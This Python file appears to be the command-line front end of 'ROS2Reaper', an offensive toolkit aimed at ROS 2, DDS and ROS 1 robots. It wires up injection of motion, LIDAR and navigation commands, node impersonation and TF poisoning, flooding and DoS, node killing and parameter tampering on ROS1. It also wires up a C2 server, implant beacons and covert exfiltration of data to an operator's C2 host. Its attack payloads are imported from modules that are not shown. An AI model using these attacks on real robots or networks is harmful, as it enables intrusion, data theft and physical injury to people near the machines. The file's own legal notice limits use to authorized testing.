#!/usr/bin/env python3
"""
ROS2Reaper - Offensive Security Toolkit for ROS 2 / DDS
=========================================================

  ██████╗  ██████╗ ███████╗██████╗ 
  ██╔══██╗██╔═══██╗██╔════╝╚════██╗
  ██████╔╝██║   ██║███████╗ █████╔╝
  ██╔══██╗██║   ██║╚════██║██╔═══╝ 
  ██║  ██║╚██████╔╝███████║███████╗
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
  ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                          
  DDS/RTPS + ROS1 Security Assessment Framework
  Author: Gh057x | v0.3.0-alpha

Usage:
    python3 ros2reaper.py <command> [options]

Commands (ROS 2 / DDS):
    discover     - Discover DDS participants on the network
    fingerprint  - Identify DDS vendor/version/configuration
    portscan     - Scan for DDS-specific ports
    listen       - Passive RTPS traffic capture
    enumerate    - Enumerate ROS 2 topics/services/nodes
    audit        - SROS2 security configuration audit
    full         - Run complete assessment (all modules)
    portcalc     - Calculate DDS ports for a domain ID

    --- Phase 2: Exploitation (ROS 2) ---
    inject       - Topic message injection (cmd_vel, LIDAR, nav, odom, swarm)
    impersonate  - Node impersonation (shadow pub, TF poison, DoS, Sybil)
    amplify      - RTPS amplification & robustness testing (no ROS 2 required)

    --- Phase 3: ICS/OT Bridge Analysis ---
    ics-enum     - ICS/OT context-aware DDS enumeration (SCADA, ATC, automotive, etc.)
    modbus-scan  - Modbus/DNP3 ↔ DDS bridge attack surface analysis
    mqtt-scan    - MQTT/EtherCAT ↔ DDS bridge attack surface analysis
    opcua-scan   - OPC UA ↔ DDS bridge attack surface analysis
    aws-scan     - AWS IoT Greengrass ↔ DDS bridge attack surface analysis
    shodan-dds   - Internet-wide DDS exposure search via Shodan API

Commands (ROS 1):
    ros1-discover  - Enumerate ROS1 nodes/topics/params via rosmaster
    ros1-inject    - Inject topics via TCPROS (cmd_vel, LIDAR blind)
    ros1-exploit   - Kill nodes / manipulate parameter server
    ros1-audit     - ROS1 security configuration audit

Commands (rosbridge / WebSocket):
    rb-enum        - Enumerate topics/nodes/services/params via rosbridge
    rb-inject      - Inject topics via rosbridge WebSocket (no ROS install needed)
    rb-audit       - Audit rosbridge security posture

Commands (Phase 3: ICS/OT Bridge Analysis):
    ics-enum       - ICS/OT context-aware DDS enumeration (SCADA, ATC, automotive, etc.)
    modbus-scan    - Modbus/DNP3 ↔ DDS bridge attack surface analysis
    mqtt-scan      - MQTT/EtherCAT ↔ DDS bridge attack surface analysis
    opcua-scan     - OPC UA ↔ DDS bridge attack surface analysis
    aws-scan       - AWS IoT Greengrass ↔ DDS bridge attack surface analysis
    shodan-dds     - Internet-wide DDS exposure search via Shodan API

Commands (Phase 4: Post-Exploitation / C2):
    c2-server      - Start operator C2 server and interactive shell
    c2-beacon      - Deploy implant beacon on compromised ROS 2 host
    c2-exfil       - Exfiltrate data from compromised host over covert DDS channel
    c2-recv        - Receive and reassemble exfiltrated data on operator side

Commands (Phase 5A: micro-ROS / XRCE):
    microros-agent  - Discover XRCE Agents and enumerate micro-ROS participants
    xrce-traffic    - Capture and analyze XRCE traffic for behavioral profiling
    xrce-hijack     - Spoof XRCE client session and inject commands
    uros-implant    - Generate micro-ROS C2 implant (C++/Arduino/Python)
    uros-persist    - Firmware-level persistence (library patch, bootloader, OTA)
    uros-c2         - Phase 5A C2 dispatcher (operator interface for implants)

Author: Gh057x
License: MIT — Use responsibly.
"""

import argparse
import json
import sys
import os
import time
import traceback
from datetime import datetime

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.rtps_parser import DDSPortCalculator, RTPSParser
from core.rtps_scanner import RTPSScanner, ScanResult
from modules.fingerprint import DDSFingerprinter, generate_fingerprint_report


# =============================================================================
# Banner
# =============================================================================

BANNER = """
\033[91m
  ██████╗  ██████╗ ███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
  ██╔══██╗██╔═══██╗██╔════╝╚════██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║   ██║███████╗ █████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██║   ██║╚════██║██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██║  ██║╚██████╔╝███████║███████╗██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
\033[0m
  \033[93mDDS/RTPS Offensive Security Toolkit\033[0m
  \033[90mAuthor: Gh057x | v0.4.0-alpha\033[0m
  \033[90mTarget: ROS 2 (Humble/Jazzy) + DDS (Fast DDS, Cyclone, Connext) | ROS 1 (Noetic/Melodic)\033[0m
"""

LEGAL_NOTICE = """
\033[91m╔══════════════════════════════════════════════════════════════════════╗
║  ⚠️  AUTHORIZED USE ONLY — MISUSE CAN CAUSE PHYSICAL HARM           ║
║  Only use on systems you own or have written authorization to test.  ║
║  Robotic systems can cause injury. Ensure safety controls are in     ║
║  place before testing. Follow responsible disclosure practices.      ║
╚══════════════════════════════════════════════════════════════════════╝\033[0m
"""


# =============================================================================
# CLI Commands
# =============================================================================

def cmd_discover(args):
    """Discover DDS participants on the network"""
    scanner = RTPSScanner(
        timeout=args.timeout,
        verbose=args.verbose,
    )

    if args.network:
        # Network-wide scan
        result = scanner.network_scan(
            network=args.network,
            domain_id=args.domain_id,
            timeout=args.timeout,
        )
        print_scan_result(result)

        if args.output:
            scanner.export_results(args.output, result)

    elif args.target:
        # Single target probe
        participants = scanner.spdp_probe(
            target=args.target,
            domain_id=args.domain_id,
            timeout=args.timeout,
        )
        print_participants(participants)

        if args.output:
            scanner.export_results(args.output)

    else:
        # Multicast probe (local network)
        print("[*] No target specified — sending multicast SPDP probe on local network")
        participants = scanner.spdp_probe(
            domain_id=args.domain_id,
            timeout=args.timeout,
        )
        print_participants(participants)

        if args.output:
            scanner.export_results(args.output)


def cmd_fingerprint(args):
    """Fingerprint DDS implementations"""
    scanner = RTPSScanner(timeout=args.timeout, verbose=args.verbose)
    fingerprinter = DDSFingerprinter(verbose=args.verbose)

    # First, discover participants
    print("[*] Discovering participants for fingerprinting...")

    if args.target:
        participants = scanner.spdp_probe(
            target=args.target,
            domain_id=args.domain_id,
            timeout=args.timeout,
        )
    else:
        participants = scanner.spdp_probe(
            domain_id=args.domain_id,
            timeout=args.timeout,
        )

    if not participants:
        print("[-] No participants discovered to fingerprint")
        return

    # Fingerprint each participant
    print(f"\n[*] Fingerprinting {len(participants)} participant(s)...\n")
    fingerprints = fingerprinter.fingerprint_all(participants)

    # Print results
    for fp in fingerprints:
        print_fingerprint(fp)

    # Generate and save report
    report = generate_fingerprint_report(fingerprints)
    print_fingerprint_summary(report["summary"])

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[*] Report saved to {args.output}")


def cmd_portscan(args):
    """Scan for DDS-specific ports"""
    scanner = RTPSScanner(timeout=args.timeout, verbose=args.verbose)

    if not args.target and not args.network:
        print("[-] Specify --target or --network for port scanning")
        return

    # Parse domain range
    domains = parse_domain_range(args.domains)

    targets = []
    if args.target:
        targets = [args.target]
    elif args.network:
        import ipaddress
        net = ipaddress.ip_network(args.network, strict=False)
        targets = [str(h) for h in net.hosts()]

    print(f"[*] Scanning {len(targets)} host(s) for DDS ports (domains {domains[0]}-{domains[-1]})")
    print(f"[*] Ports per host: {len(DDSPortCalculator.ports_for_domain_range(domains[0], domains[-1]))}")

    all_results = {}
    for target in targets:
        result = scanner.port_scan(target, domain_ids=domains)
        all_results.update(result)
        if result.get(target):
            for port in result[target]:
                port_info = DDSPortCalculator.identify_port(port)
                info = ""
                if port_info:
                    info = f" → Domain {port_info['domain_id']}, {port_info['type']}"
                    if port_info.get('participant_id') is not None:
                        info += f", Participant {port_info['participant_id']}"
                print(f"  \033[92m[+]\033[0m {target}:{port}{info}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(all_results, f, indent=2)
        print(f"\n[*] Results saved to {args.output}")


def cmd_listen(args):
    """Passive RTPS traffic capture"""
    scanner = RTPSScanner(verbose=args.verbose)

    print(f"[*] Passive listening on domain {args.domain_id} for {args.duration}s...")
    print("[*] No packets will be sent — stealth mode")

    participants = scanner.passive_listen(
        domain_id=args.domain_id,
        duration=args.duration,
    )

    print_participants(participants)

    if args.output:
        scanner.export_results(args.output)


def cmd_portcalc(args):
    """Calculate DDS ports for given domain IDs"""
    domains = parse_domain_range(args.domains)

    print(f"\n{'Domain':>8} | {'Disc MC':>8} | {'Disc UC':>8} | {'User MC':>8} | {'User UC':>8}")
    print("-" * 55)

    for did in domains:
        disc_mc = DDSPortCalculator.discovery_multicast(did)
        disc_uc = DDSPortCalculator.discovery_unicast(did, 0)
        user_mc = DDSPortCalculator.user_multicast(did)
        user_uc = DDSPortCalculator.user_unicast(did, 0)
        print(f"{did:>8} | {disc_mc:>8} | {disc_uc:>8} | {user_mc:>8} | {user_uc:>8}")

    if args.verbose:
        print(f"\nAll unique ports for domains {domains[0]}-{domains[-1]}:")
        all_ports = DDSPortCalculator.ports_for_domain_range(domains[0], domains[-1])
        print(f"  {', '.join(str(p) for p in all_ports)}")
        print(f"  Total: {len(all_ports)} ports")


def cmd_full(args):
    """Run complete assessment"""
    scanner = RTPSScanner(timeout=args.timeout, verbose=args.verbose)
    fingerprinter = DDSFingerprinter(verbose=args.verbose)
    
    report = {
        "assessment": {
            "type": "full",
            "timestamp": datetime.now().isoformat(),
            "target": args.network or args.target or "local",
            "domain_id": args.domain_id,
        },
        "discovery": None,
        "fingerprints": None,
        "port_scan": None,
    }

    # Phase 1: Discovery
    print("\n" + "=" * 60)
    print("  PHASE 1: DDS PARTICIPANT DISCOVERY")
    print("=" * 60)

    if args.network:
        scan_result = scanner.network_scan(
            network=args.network,
            domain_id=args.domain_id,
        )
        report["discovery"] = scan_result.to_dict()
        print_scan_result(scan_result)
    else:
        target = args.target
        participants = scanner.spdp_probe(
            target=target,
            domain_id=args.domain_id,
        )
        report["discovery"] = {
            "participants_found": len(participants),
            "participants": [p.to_dict() for p in participants],
        }
        print_participants(participants)

    # Phase 2: Fingerprinting
    all_participants = scanner.get_all_discovered()
    if all_participants:
        print("\n" + "=" * 60)
        print("  PHASE 2: DDS IMPLEMENTATION FINGERPRINTING")
        print("=" * 60)

        fingerprints = fingerprinter.fingerprint_all(all_participants)
        fp_report = generate_fingerprint_report(fingerprints)
        report["fingerprints"] = fp_report

        for fp in fingerprints:
            print_fingerprint(fp)
        print_fingerprint_summary(fp_report["summary"])

    # Phase 3: Port Scan (if target specified)
    if args.target or args.network:
        print("\n" + "=" * 60)
        print("  PHASE 3: DDS PORT SCAN")
        print("=" * 60)

        targets = []
        if args.target:
            targets = [args.target]
        elif args.network:
            # Only scan hosts that responded to discovery
            targets = list(set(
                p.source_ip for p in all_participants if p.source_ip
            ))

        if len(targets) > 10:
            print(f"[!] Capping port scan to 10 of {len(targets)} discovered hosts")
        for target in targets[:10]:  # Cap at 10 hosts
            result = scanner.port_scan(target, domain_ids=list(range(0, 5)))
            if report["port_scan"] is None:
                report["port_scan"] = {}
            report["port_scan"][target] = result.get(target, [])

    # Save report
    output = args.output or f"ros2reaper_report_{int(time.time())}.json"
    with open(output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"\n[*] Full report saved to {output}")


def cmd_enumerate(args):
    """Enumerate ROS 2 topics, services, and nodes"""
    from modules.topic_enum import TopicEnumerator, print_ros2_graph

    scanner = RTPSScanner(timeout=args.timeout, verbose=args.verbose)

    print("[*] Discovering participants for enumeration...")
    if args.target:
        participants = scanner.spdp_probe(target=args.target, domain_id=args.domain_id,
                                           timeout=args.timeout)
    else:
        participants = scanner.spdp_probe(domain_id=args.domain_id, timeout=args.timeout)

    if not participants:
        print("[-] No participants found")
        return

    enumerator = TopicEnumerator(verbose=args.verbose)
    graph = enumerator.enumerate(participants, domain_id=args.domain_id,
                                  timeout=args.timeout)
    print_ros2_graph(graph)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(graph.to_dict(), f, indent=2, default=str)
        print(f"[*] Enumeration saved to {args.output}")


def cmd_audit(args):
    """Run SROS2 security audit"""
    from modules.sros2_audit import SROS2Auditor, print_audit_report

    scanner = RTPSScanner(timeout=args.timeout, verbose=args.verbose)

    print("[*] Discovering participants for audit...")
    if args.target:
        participants = scanner.spdp_probe(target=args.target, domain_id=args.domain_id,
                                           timeout=args.timeout)
    elif args.network:
        result = scanner.network_scan(network=args.network, domain_id=args.domain_id)
        participants = result.participants
    else:
        participants = scanner.spdp_probe(domain_id=args.domain_id, timeout=args.timeout)

    auditor = SROS2Auditor(verbose=args.verbose)
    target_name = args.target or args.network or "local"
    report = auditor.audit_participants(participants, target_name)
    print_audit_report(report)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report.to_dict(), f, indent=2, default=str)
        print(f"[*] Audit report saved to {args.output}")


# =============================================================================
# Phase 2: Exploitation Commands
# =============================================================================

def cmd_inject(args):
    """Topic injection attacks (cmd_vel, LIDAR, nav, odom, swarm)"""
    try:
        from modules.topic_injection import TopicInjector, ATTACK_PRESETS
        import rclpy
    except ImportError:
        print("[!] ROS 2 libraries required for injection attacks")
        print("[!] Run from the attacker container: docker compose exec attacker bash")
        return

    mode = args.attack_mode or "cmd_vel"
    print(f"\n[*] Attack mode: {mode}")
    print(f"[*] Namespace:   {args.namespace}")
    print(f"[*] Domain:      {args.domain_id}")
    print(f"[*] Duration:    {args.duration}s\n")

    rclpy.init()

    import threading

    injector = TopicInjector(
        namespace=args.namespace,
        domain_id=args.domain_id,
        verbose=args.verbose,
    )

    def run_attack():
        if mode == "cmd_vel":
            injector.attack_cmd_vel(preset=args.preset, duration=args.duration)
        elif mode == "lidar":
            injector.attack_lidar_spoof(mode=args.lidar_mode, duration=args.duration)
        elif mode == "nav":
            injector.attack_nav_goal(x=args.x, y=args.y, duration=args.duration)
        elif mode == "odom":
            injector.attack_odom_spoof(duration=args.duration)
        elif mode == "swarm":
            injector.attack_swarm_convergence(
                namespaces=args.namespaces,
                convergence_x=args.x, convergence_y=args.y,
                duration=args.duration,
            )
        else:
            print(f"[!] Unknown inject mode: {mode}")
        rclpy.shutdown()

    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()

    try:
        rclpy.spin(injector)
    except Exception:
        pass

    attack_thread.join(timeout=5)

    if args.output:
        injector.export_results(args.output)

    try:
        injector.destroy_node()
    except Exception:
        pass


def cmd_impersonate(args):
    """Node impersonation attacks (shadow, tf, dos, sybil)"""
    try:
        from modules.node_impersonation import NodeImpersonator
        import rclpy
    except ImportError:
        print("[!] ROS 2 libraries required for impersonation attacks")
        return

    mode = args.attack_mode or "shadow"
    target_node = args.target_node or "fake_robot_1"

    print(f"\n[*] Attack mode:  {mode}")
    print(f"[*] Target node:  {target_node}")
    print(f"[*] Namespace:    {args.namespace}")
    print(f"[*] Duration:     {args.duration}s\n")

    rclpy.init()

    if mode == "sybil":
        results = NodeImpersonator.sybil_attack(
            namespace=args.namespace,
            num_clones=args.count,
            domain_id=args.domain_id,
            duration=args.duration,
            verbose=args.verbose,
        )
        if args.output:
            data = {
                "tool": "ROS2Reaper", "module": "node_impersonation",
                "timestamp": datetime.now().isoformat(),
                "results": [r.to_dict() for r in results],
            }
            with open(args.output, "w") as f:
                json.dump(data, f, indent=2)
        rclpy.shutdown()
        return

    import threading

    imp = NodeImpersonator(
        target_node_name=target_node,
        namespace=args.namespace,
        domain_id=args.domain_id,
        verbose=args.verbose,
    )

    def run_attack():
        if mode == "shadow":
            imp.attack_shadow_publisher(
                topics=[{"name": "cmd_vel", "msg_type": "Twist", "rate_hz": 100,
                          "data": {"linear_x": 0.0, "angular_z": 0.0}}],
                duration=args.duration,
            )
        elif mode == "tf":
            imp.attack_tf_poison(duration=args.duration)
        elif mode == "dos":
            imp.attack_topic_dos(duration=args.duration)
        else:
            print(f"[!] Unknown impersonate mode: {mode}")
        rclpy.shutdown()

    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()

    try:
        rclpy.spin(imp)
    except Exception:
        pass

    attack_thread.join(timeout=5)

    if args.output:
        imp.export_results(args.output)

    try:
        imp.destroy_node()
    except Exception:
        pass


def cmd_amplify(args):
    """RTPS amplification and robustness testing"""
    from modules.amplification import RTSPAmplificationTester

    if not args.target:
        print("[!] --target required for amplification testing")
        return

    mode = args.attack_mode or "full_suite"

    print(f"\n[*] Test mode:  {mode}")
    print(f"[*] Target:     {args.target}")
    print(f"[*] Domain:     {args.domain_id}\n")

    tester = RTSPAmplificationTester(verbose=args.verbose or mode == "full_suite")

    if mode == "full_suite":
        tester.run_full_suite(args.target, args.domain_id)
    elif mode == "reflect":
        tester.test_spdp_reflection(args.target, args.domain_id)
    elif mode == "exhaust":
        tester.test_participant_exhaustion(args.target, args.domain_id,
                                            num_participants=args.count)
    elif mode == "fuzz":
        tester.test_malformed_packets(args.target, args.domain_id)
    elif mode == "heartbeat":
        tester.test_heartbeat_amplification(args.target, args.domain_id,
                                              num_heartbeats=args.count)
    else:
        print(f"[!] Unknown amplify mode: {mode}")

    if args.output:
        tester.export_results(args.output)


# =============================================================================
# ROS1 Commands
# =============================================================================

def cmd_ros1_discover(args):
    """Enumerate ROS1 nodes, topics, services and parameters via rosmaster"""
    from modules.ros1_enum import ROS1Enumerator

    if not args.target:
        print("[-] --target required for ros1-discover (rosmaster IP)")
        return

    port = args.ros1_port
    print(f"[*] Enumerating ROS1 deployment at {args.target}:{port}...")

    enumerator = ROS1Enumerator(verbose=args.verbose, timeout=args.timeout)
    system = enumerator.enumerate(args.target, port=port)
    print_ros1_system(system)

    if args.output:
        enumerator.export_results(args.output)


def cmd_ros1_inject(args):
    """Inject topics into a ROS1 deployment via TCPROS"""
    from modules.ros1_injection import ROS1Injector

    if not args.target:
        print("[-] --target required for ros1-inject (rosmaster IP)")
        return

    mode = args.attack_mode or "cmd_vel"
    topic = args.topic or ("/cmd_vel" if mode == "cmd_vel" else "/scan")

    print(f"\n[*] ROS1 injection")
    print(f"[*] Master:   {args.target}:{args.ros1_port}")
    print(f"[*] Topic:    {topic}")
    print(f"[*] Mode:     {mode}")
    print(f"[*] Duration: {args.duration}s\n")

    injector = ROS1Injector(
        master_host=args.target,
        master_port=args.ros1_port,
        verbose=args.verbose,
    )

    if mode == "cmd_vel":
        injector.inject_cmd_vel(
            topic=topic,
            preset=args.preset,
            duration=args.duration,
        )
    elif mode == "lidar":
        injector.inject_lidar_blind(
            topic=topic,
            duration=args.duration,
        )
    else:
        print(f"[!] Unknown ros1-inject mode: {mode}  (use cmd_vel or lidar)")

    if args.output:
        injector.export_results(args.output)


def cmd_ros1_exploit(args):
    """Kill ROS1 nodes and/or manipulate the parameter server"""
    from modules.ros1_exploitation import ROS1Exploiter

    if not args.target:
        print("[-] --target required for ros1-exploit (rosmaster IP)")
        return

    exploiter = ROS1Exploiter(verbose=args.verbose, timeout=args.timeout)
    port = args.ros1_port
    results = []

    if args.kill_all:
        print(f"[*] Killing ALL nodes on {args.target}:{port}...")
        results = exploiter.kill_all_nodes(args.target, port=port)

    elif args.node:
        print(f"[*] Killing node {args.node} on {args.target}:{port}...")
        results = [exploiter.kill_node(args.target, args.node, port=port)]

    elif args.param_key and args.param_value is not None:
        # Auto-convert value: try int → float → str
        val: object = args.param_value
        for conv in (int, float):
            try:
                val = conv(args.param_value)
                break
            except ValueError:
                pass
        results = [exploiter.set_param(args.target, args.param_key, val, port=port)]

    elif args.param_key:
        # Read or delete
        print(f"[*] Deleting parameter {args.param_key}...")
        results = [exploiter.delete_param(args.target, args.param_key, port=port)]

    else:
        # Default: dump params
        print(f"[*] Dumping parameter server on {args.target}:{port}...")
        params = exploiter.dump_params(args.target, port=port)
        _print_params(params)
        if args.output:
            with open(args.output, "w") as f:
                import json as _json
                _json.dump(params, f, indent=2, default=str)
            print(f"[*] Parameters saved to {args.output}")
        return

    if results:
        ok = sum(1 for r in results if r.success)
        print(f"\n[*] {ok}/{len(results)} operation(s) succeeded")

    if args.output:
        exploiter.export_results(args.output)


def cmd_ros1_audit(args):
    """Run a ROS1 security audit against a rosmaster"""
    from modules.ros1_enum import ROS1Enumerator
    from modules.ros1_audit import ROS1Auditor
    from modules.sros2_audit import print_audit_report

    if not args.target:
        print("[-] --target required for ros1-audit (rosmaster IP)")
        return

    port = args.ros1_port
    print(f"[*] Enumerating ROS1 deployment at {args.target}:{port}...")
    system = ROS1Enumerator(verbose=args.verbose, timeout=args.timeout).enumerate(
        args.target, port=port
    )

    auditor = ROS1Auditor(verbose=args.verbose)
    report = auditor.audit(system)

    # Reuse the same print_audit_report() from sros2_audit — same format
    print_audit_report(report)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report.to_dict(), f, indent=2, default=str)
        print(f"[*] ROS1 audit report saved to {args.output}")


# =============================================================================
# ROSBridge Commands
# =============================================================================

def cmd_rb_enum(args):
    """Enumerate ROS compute graph via rosbridge WebSocket"""
    from modules.rosbridge import RosbridgeEnumerator

    if not args.target:
        print("[-] --target required for rb-enum (rosbridge host)")
        return

    port = args.rb_port
    print(f"\n[*] rosbridge enumeration at {args.target}:{port}")

    enumerator = RosbridgeEnumerator(port=port, timeout=args.timeout,
                                     verbose=args.verbose)
    result = enumerator.enumerate(args.target)

    if result.errors and not result.topics and not result.nodes:
        print(f"[!] Enumeration failed: {result.errors[0]}")
        return

    print(f"\n\033[92m[+] rosbridge at {args.target}:{port} — enumeration complete\033[0m\n")

    if result.topics:
        print(f"  Topics ({len(result.topics)}):")
        for t in sorted(result.topics, key=lambda x: x.name):
            type_str = f"  [{t.msg_type}]" if t.msg_type else ""
            print(f"    {t.name}{type_str}")

    if result.nodes:
        print(f"\n  Nodes ({len(result.nodes)}):")
        for n in sorted(result.nodes):
            print(f"    {n}")

    if result.services:
        print(f"\n  Services ({len(result.services)}):")
        for s in sorted(result.services):
            print(f"    {s}")

    if result.params:
        print(f"\n  Parameters ({len(result.params)}):")
        for p in sorted(result.params)[:20]:
            print(f"    {p}")
        if len(result.params) > 20:
            print(f"    ... and {len(result.params) - 20} more")

    if args.output:
        enumerator.export_results(args.output)


def cmd_rb_inject(args):
    """Inject topics via rosbridge WebSocket"""
    from modules.rosbridge import RosbridgeInjector

    if not args.target:
        print("[-] --target required for rb-inject (rosbridge host)")
        return

    mode = args.attack_mode or "cmd_vel"
    port = args.rb_port

    print(f"\n[*] rosbridge injection")
    print(f"[*] Target:   {args.target}:{port}")
    print(f"[*] Mode:     {mode}")
    print(f"[*] Duration: {args.duration}s\n")

    injector = RosbridgeInjector(host=args.target, port=port,
                                  timeout=args.timeout, verbose=args.verbose)

    if mode == "cmd_vel":
        topic = args.topic or "/cmd_vel"
        injector.inject_cmd_vel(topic=topic, preset=args.preset,
                                 linear_x=args.lx, angular_z=args.az,
                                 duration=args.duration)
    elif mode == "lidar":
        topic = args.topic or "/scan"
        injector.inject_lidar(topic=topic, mode=args.lidar_mode,
                               duration=args.duration)
    elif mode == "nav":
        topic = args.topic or "/goal_pose"
        injector.inject_nav_goal(topic=topic, x=args.x, y=args.y,
                                  duration=args.duration)
    else:
        print(f"[!] Unknown rb-inject mode: {mode}  (use cmd_vel, lidar, or nav)")
        return

    if args.output:
        injector.export_results(args.output)


def cmd_rb_audit(args):
    """Audit rosbridge WebSocket security posture"""
    from modules.rosbridge import RosbridgeAuditor, RosbridgeEnumerator
    from modules.sros2_audit import print_audit_report

    if not args.target:
        print("[-] --target required for rb-audit (rosbridge host)")
        return

    port = args.rb_port
    print(f"[*] Enumerating rosbridge at {args.target}:{port}...")

    enumerator = RosbridgeEnumerator(port=port, timeout=args.timeout,
                                     verbose=args.verbose)
    enum_result = enumerator.enumerate(args.target)

    auditor = RosbridgeAuditor(port=port, timeout=args.timeout,
                                verbose=args.verbose)
    report = auditor.audit(args.target, enum_result=enum_result)

    print_audit_report(report)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report.to_dict(), f, indent=2, default=str)
        print(f"[*] rosbridge audit report saved to {args.output}")


# =============================================================================
# Phase 3: ICS/OT Bridge Commands
# =============================================================================

def cmd_ics_enum(args):
    """ICS/OT context-aware DDS enumeration"""
    from modules.phase3.ics_dds_enum import ICSDDSEnumerator
    import argparse as _ap

    if not args.target and not args.network and not args.passive:
        print("[-] Specify --target, --network, or --passive for ics-enum")
        return

    # Build a namespace that matches ICSDDSEnumerator's expected args
    p3_args = _ap.Namespace(
        target=args.target,
        cidr=args.network,
        passive=args.passive,
        domain=args.domain_id,
        timeout=args.timeout,
        threads=args.threads,
        passive_duration=args.passive_duration,
        deep=args.deep,
        output=args.output,
        context=args.context,
    )

    enumerator = ICSDDSEnumerator(p3_args)
    enumerator.run()


def cmd_modbus_scan(args):
    """Modbus/DNP3 ↔ DDS bridge analysis"""
    from modules.phase3.modbus_dnp3_bridge import ModbusDNP3BridgeScanner
    import argparse as _ap

    if not args.target and not args.network:
        print("[-] Specify --target or --network for modbus-scan")
        return

    p3_args = _ap.Namespace(
        target=args.target,
        cidr=args.network,
        timeout=args.timeout,
        threads=args.threads,
        deep=args.deep,
        modbus_enumerate=args.modbus_enumerate,
        output=args.output,
    )

    scanner = ModbusDNP3BridgeScanner(p3_args)
    scanner.run()


def cmd_mqtt_scan(args):
    """MQTT/EtherCAT ↔ DDS bridge analysis"""
    from modules.phase3.mqtt_ethercat_bridge import MQTTEtherCATBridgeScanner
    import argparse as _ap

    if not args.target and not args.network:
        print("[-] Specify --target or --network for mqtt-scan")
        return

    p3_args = _ap.Namespace(
        target=args.target,
        cidr=args.network,
        timeout=args.timeout,
        threads=args.threads,
        deep=args.deep,
        mqtt_enumerate=args.mqtt_enumerate,
        enum_duration=args.enum_duration,
        output=args.output,
    )

    scanner = MQTTEtherCATBridgeScanner(p3_args)
    scanner.run()


def cmd_opcua_scan(args):
    """OPC UA ↔ DDS bridge analysis"""
    from modules.phase3.opcua_dds_bridge import OpcuaDDSBridgeScanner
    import argparse as _ap

    if not args.target and not args.network:
        print("[-] Specify --target or --network for opcua-scan")
        return

    p3_args = _ap.Namespace(
        target=args.target,
        cidr=args.network,
        timeout=args.timeout,
        threads=args.threads,
        deep=args.deep,
        enumerate_nodes=args.enumerate_nodes,
        output=args.output,
    )

    scanner = OpcuaDDSBridgeScanner(p3_args)
    scanner.run()


def cmd_aws_scan(args):
    """AWS IoT Greengrass ↔ DDS bridge analysis"""
    from modules.phase3.aws_iot_bridge import AWSIoTBridgeScanner
    import argparse as _ap

    if not args.target and not args.network:
        print("[-] Specify --target or --network for aws-scan")
        return

    p3_args = _ap.Namespace(
        target=args.target,
        cidr=args.network,
        timeout=args.timeout,
        threads=args.threads,
        deep=args.deep,
        shadow_enumerate=args.shadow_enumerate,
        output=args.output,
    )

    scanner = AWSIoTBridgeScanner(p3_args)
    scanner.run()


# =============================================================================
# Phase 4: C2 Commands
# =============================================================================

def cmd_c2_server(args):
    """Start operator C2 server and interactive shell"""
    from modules.phase4.c2_server import run_server
    from modules.phase4.c2_channel import DEFAULT_KEY

    key = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
    print(f"[*] Starting C2 server on domain {args.domain_id}")
    run_server(
        domain_id = args.domain_id,
        key       = key,
        verbose   = args.verbose,
        output    = args.output,
    )


def cmd_c2_beacon(args):
    """Deploy C2 beacon / implant on this host"""
    from modules.phase4.c2_beacon import run_beacon
    from modules.phase4.c2_channel import DEFAULT_KEY

    if not args.target:
        print("[-] --target required for c2-beacon (C2 server IP)")
        return

    key = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
    print(f"[*] Starting beacon → C2 at {args.target}  interval={args.c2_interval}s")
    run_beacon(
        c2_ip     = args.target,
        domain_id = args.domain_id,
        interval  = args.c2_interval,
        key       = key,
        max_ttl   = args.c2_ttl,
        verbose   = args.verbose,
    )


def cmd_c2_exfil(args):
    """Exfiltrate data from this host to C2 server over covert DDS channel"""
    from modules.phase4.c2_exfil import run_exfil
    from modules.phase4.c2_channel import DEFAULT_KEY, _make_session_id

    if not args.target:
        print("[-] --target required for c2-exfil (C2 server IP)")
        return

    mode   = args.exfil_mode or "env"
    key    = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
    sid    = args.c2_session or _make_session_id()
    params = {}
    if args.exfil_path:
        params["path"]  = args.exfil_path
    if args.topic:
        params["topic"] = args.topic

    print(f"[*] Exfil mode={mode}  target={args.target}  session={sid}")
    run_exfil(
        c2_ip      = args.target,
        session_id = sid,
        mode       = mode,
        params     = params,
        domain_id  = args.domain_id,
        key        = key,
        verbose    = args.verbose,
    )


def cmd_c2_recv(args):
    """Receive and reassemble exfil data on operator side"""
    from modules.phase4.c2_exfil import run_exfil_receive
    from modules.phase4.c2_channel import DEFAULT_KEY

    if not args.c2_session:
        print("[-] --c2-session required for c2-recv")
        return

    key = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
    run_exfil_receive(
        session_id = args.c2_session,
        output     = args.output,
        domain_id  = args.domain_id,
        key        = key,
        timeout    = args.timeout,
        verbose    = args.verbose,
    )


